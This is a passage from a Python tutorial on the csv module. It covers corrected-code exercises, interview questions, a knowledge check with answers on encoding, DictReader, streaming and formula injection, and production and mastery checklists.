for row in rows:
    process(row)
```
*Diagnose:* is a second pass, or random access, genuinely needed here
(§48.3)? *Corrected:* stream directly with `for row in reader:` (§28.2),
if not.

**11. An incorrect `Sniffer` assumption.**
```python
dialect = csv.Sniffer().sniff(sample)
reader = csv.reader(f, dialect=dialect)   # used directly, with no verification
```
*Diagnose:* what could go wrong if `sample` is small or ambiguous
(§27.3)? *Corrected:* validate the guessed dialect (e.g. confirm the
expected number of columns results) before trusting it.

**12. Duplicate-identifier handling ignored entirely.**
```python
customers_by_id = {row["customer_id"]: row for row in reader}
```
*Diagnose:* what silently happens if `customer_id` is not actually
unique in the source file (§34.2, §36.2)? *Corrected:* detect
duplicates explicitly first, and decide deliberately how to handle
them, before building the lookup dictionary.

## 52. Interview Questions

Beginner:
1. What is CSV? (§3)
2. Why is CSV considered a text format? (§4)
3. Why not use `split(",")` to parse CSV? (§9)
4. What is quoting, and why is it necessary? (§7.1)
5. What is a dialect? (§20.1)
6. What is `csv.reader`, and what does each row it yields look like?
   (§12)
7. What is `csv.writer`? (§14)

Intermediate:
8. `DictReader` vs. `reader` — what's the practical difference, and
   when would you prefer each? (§16.2)
9. `DictWriter` vs. `writer` — same question. (§18–§19)
10. Why is `newline=""` used when opening CSV files? (§26.2)
11. Why specify `encoding=` explicitly? (§26.3)
12. What does `csv.Sniffer` do, and what are its limits? (§27)
13. What is `csv.Error`, and when is it raised? (§24.2)
14. What does `strict=True` do? (§23.2, §24.1)
15. What is `csv.field_size_limit()` for? (§25)

Advanced / production-oriented:
16. How would you process a 10 GB CSV file in Python? (§28)
17. How would you validate a CSV file's schema? (§31)
18. How would you handle malformed rows in a large ingestion job? (§24.3)
19. How would you handle missing values, given CSV has no universal
    null convention? (§32)
20. How would you prevent CSV injection (formula injection) when
    exporting user-supplied data? (§37)
21. CSV vs. JSON — when would you choose one over the other? (§38.3)
22. CSV vs. a database — what does CSV fundamentally lack? (§38.2)
23. How would you design a production CSV ingestion pipeline, at a high
    level? (§39, §46.2)

Scenario-based:
24. A teammate's CSV import works for most files but occasionally
    raises `KeyError` on a column name that "should" be there. What
    would you check first? (§26.4, §31.3, §43)
25. You're asked to merge two CSV files on a shared ID column, but you
    discover the ID column isn't actually unique in one of them. What
    do you do before writing any joining code? (§34.2, §36.2)
26. A CSV export is later opened in Excel by a non-technical user, who
    reports "weird popups" about external links. What's the most likely
    cause, and how would you have prevented it? (§37)

## 53. Knowledge Check

**A. Conceptual**
1. In your own words, explain why CSV having "no built-in data types"
   is not a bug, but a fundamental property of the format.
2. Explain why a CSV "row" is not always the same thing as one physical
   line of text in the file.

**B. Code-reading**
3. What does the following produce, and why?
```python
writer = csv.writer(f, quoting=csv.QUOTE_ALL)
writer.writerow(["Alice", 30])
```

**C. Predict-the-output**
4. Given the header `name,age,city` and the row `Bob,25` (missing
   `city`), what does `csv.DictReader(f, restval="?")` produce for
   that row?

**D. API-selection**
5. You need to read a CSV file where you don't know the column order
   in advance, but you do know the column names. Which reader class
   should you reach for, and why?
6. You need to write rows where some dictionaries might be missing a
   key that others have. Which `DictWriter` parameter controls what
   gets written in that gap?

**E. Debugging**
7. A CSV file parses without error, but every value in the first
   column has an invisible extra character glued onto the very first
   header name. What's the most likely explanation, and how would you
   confirm it?

**F. Data-quality**
8. Why is checking `if value == "":` alone often not a sufficient
   missing-value check for real-world CSV data?

**G. Security**
9. Why is a value like `=SUM(A1:A10)`, appearing in a plain user-
   submitted "notes" field, a genuine risk once that data is exported
   to CSV and later opened in a spreadsheet?

**H. Performance**
10. Why does `list(csv.reader(f))` not change how much *parsing* work
    is done overall, compared to `for row in csv.reader(f):` — and
    what does it change instead?

**I. Production-design**
11. In a CSV ingestion pipeline, why is it generally better to
    quarantine individually bad rows rather than aborting the entire
    file the moment one malformed row is found?

---

**Answer key**

1. CSV is fundamentally text (§4.1) — nothing about the format itself
   distinguishes a number, a boolean, or a date from ordinary
   characters; every value's *meaning* as a specific type is something
   your application must decide and apply explicitly (§10, §33).
2. A CSV "row" ends at a newline **only when that newline is not inside
   an open quoted field** — a quoted field can legitimately span
   several physical lines (§8.1), so "one row" and "one line" are only
   the same thing when no field happens to contain an embedded newline.
3. `"Alice",30` — every field is quoted regardless of whether it
   structurally needs it, because `QUOTE_ALL` quotes unconditionally
   (§22.2). (Note: `30`, passed as an `int`, is converted to text and
   also quoted under `QUOTE_ALL`.)
4. `{'name': 'Bob', 'age': '25', 'city': '?'}` — `restval="?"` fills in
   any column the header defines that a short row does not actually
   provide (§17.3).
5. `csv.DictReader` — because it lets you access fields by column name
   (`row["name"]`) rather than by position, making the code immune to
   column reordering (§16.2).
6. `restval` — it controls what gets written for any `fieldnames`
   column a given row's dictionary lacks a key for (§19.2).
7. A UTF-8 BOM, most likely from a file exported by Excel on Windows —
   confirm by printing `repr(reader.fieldnames)` and checking for a
   leading `﻿` character; fix by opening with
   `encoding="utf-8-sig"` instead of plain `"utf-8"` (§26.4).
8. Real-world CSV data uses many different missing-value conventions —
   `"NULL"`, `"N/A"`, `"unknown"`, and genuinely empty strings can all,
   in different files or even different columns of the same file, mean
   "missing" — checking only for an empty string misses every other
   convention (§32.1–§32.2).
9. Many spreadsheet applications automatically execute a cell's content
   as a formula if it begins with `=` (among other trigger characters),
   regardless of the fact that the data originated as plain CSV text —
   this can exfiltrate data or trigger unwanted external requests the
   moment the file is opened (§37.1–§37.2).
10. The total parsing work is identical either way — every row is
    parsed exactly once in both cases. What changes is **when** that
    work happens (all up front for `list(...)`, versus interleaved with
    processing for direct iteration) and, more importantly, **peak
    memory usage** — `list(...)` holds every parsed row simultaneously,
    while direct iteration holds only one row at a time (§48.1–§48.2).
11. Aborting an entire large, mostly-valid file over a small number of
    bad rows discards a great deal of genuinely good, usable data along
    with the actual problem, and gives operators far less specific,
    actionable information than a report naming exactly which rows
    failed and why (§24.3, §39.2's "quarantine" stage).

## 54. Production Checklist

**Format**
- [ ] The delimiter is explicitly known (confirmed, or configured, not
      assumed) (§6).
- [ ] Quoting is correctly configured to match the source data's actual
      convention (§7, §13.2).
- [ ] `newline=""` is used whenever a CSV file is opened, for both
      reading and writing (§26.2).
- [ ] `encoding=` is always specified explicitly, with `utf-8-sig`
      considered for Excel-originated files (§26.3–§26.4).

**Validation**
- [ ] Headers are validated against the columns the code actually
      requires (§31.3).
- [ ] Row structure (field count) is validated where ragged rows would
      be a real problem, not silently tolerated by `DictReader`'s
      defaults (§17.3–§17.4).
- [ ] Required fields are validated explicitly (§30.2).
- [ ] Types are validated and converted deliberately, never assumed
      (§33).
- [ ] Business rules beyond mere type-correctness are validated where
      relevant (§46.2's currency/amount example).

**Robustness**
- [ ] Malformed rows are handled explicitly — quarantined and reported,
      not silently discarded (§24.3–§24.4).
- [ ] Missing values are handled according to an explicit, documented
      convention (§32).
- [ ] Unexpected/extra columns are handled deliberately
      (`extrasaction`, §19.3), not by accident.
- [ ] Duplicate records/identifiers are detected, not silently
      overwritten (§34).

**Performance**
- [ ] Streaming is used for large files; `list(reader)` is a deliberate
      choice, not a reflex (§28, §48.3).
- [ ] Unnecessary repeated file passes are avoided where a single
      streaming pass would do.
- [ ] `field_size_limit()` has been considered for data sources that
      may legitimately contain very large fields (§25).

**Security**
- [ ] Untrusted CSV input is validated before being trusted for any
      decision (§37.4).
- [ ] CSV injection mitigation is applied when exporting untrusted,
      user-supplied text for spreadsheet consumption (§37.1–§37.3).
- [ ] Resource-exhaustion risk from oversized fields or files has been
      considered (§25.2, §37.4).

**Testing**
- [ ] A valid CSV file is tested end to end (§42.2).
- [ ] An empty CSV and a header-only CSV are both tested (§42.6).
- [ ] Malformed CSV is tested, including under `strict=True` (§42.5).
- [ ] Quoted fields and multiline fields are tested (§42.3–§42.4).
- [ ] Missing values are tested (§42.5).
- [ ] Duplicate data is tested (§42.5).
- [ ] Invalid types are tested (§33, §42).

**Observability**
- [ ] Errors are useful and specific — naming the actual offending
      value/row, not just "invalid data" (§33.2).
- [ ] A summary of what happened (counts of valid/rejected records) is
      produced, not just silently discarded rows (§46.1–§46.2).
- [ ] Rejected records remain identifiable (which row, which reason),
      not merged back indistinguishably with valid data.

## 55. Final Mastery Checklist

You should be able to confidently say:

- [ ] I understand what CSV is, and why it remains widely used.
- [ ] I understand rows, columns, fields, and headers.
- [ ] I understand delimiters, and that CSV is more precisely
      "delimited text" than strictly comma-only.
- [ ] I understand quoting, and why it is necessary.
- [ ] I understand escaped quotes (`doublequote` vs. `escapechar`).
- [ ] I understand multiline fields, and why they exist.
- [ ] I understand why `split(",")` is unsafe for parsing CSV.
- [ ] I can use `csv.reader` and every important parameter it accepts.
- [ ] I can use `csv.writer`, including `lineterminator` and why
      `newline=""` matters.
- [ ] I can use `csv.DictReader`, including `fieldnames`, `restkey`,
      and `restval`.
- [ ] I can use `csv.DictWriter`, including `fieldnames`, `restval`,
      and `extrasaction`.
- [ ] I understand CSV dialects, and can register and use a custom one.
- [ ] I understand the four core quoting constants, and am aware that
      newer, more specialized ones exist as of Python 3.12.
- [ ] I understand `csv.Sniffer`, and why its output must be validated,
      not trusted blindly.
- [ ] I understand `csv.Error`, and how to handle it deliberately.
- [ ] I understand `csv.field_size_limit()` and why it exists.
- [ ] I can correctly handle encoding and newlines specifically for
      CSV files.
- [ ] I can validate CSV schemas, required fields, and types at the
      boundary.
- [ ] I can convert CSV field text to real data types safely and
      explicitly.
- [ ] I can process large CSV files without loading everything into
      memory.
- [ ] I can build a read → validate → convert → transform → write
      pipeline.
- [ ] I can test CSV-processing code with `pytest`'s `tmp_path`.
- [ ] I can debug malformed or misbehaving CSV code systematically.
- [ ] I understand CSV injection and other CSV-specific security
      considerations.
- [ ] I understand when CSV is, and is not, the appropriate tool,
      relative to JSON and databases.
- [ ] I can design a production-oriented CSV ingestion pipeline, with
      clean/reject outputs and reportable summary metrics.

With this foundation in place, you are ready for
[04-json-and-serialization.md](04-json-and-serialization.md), where the
flat, text-only world of CSV gives way to nested, typed structured
data.
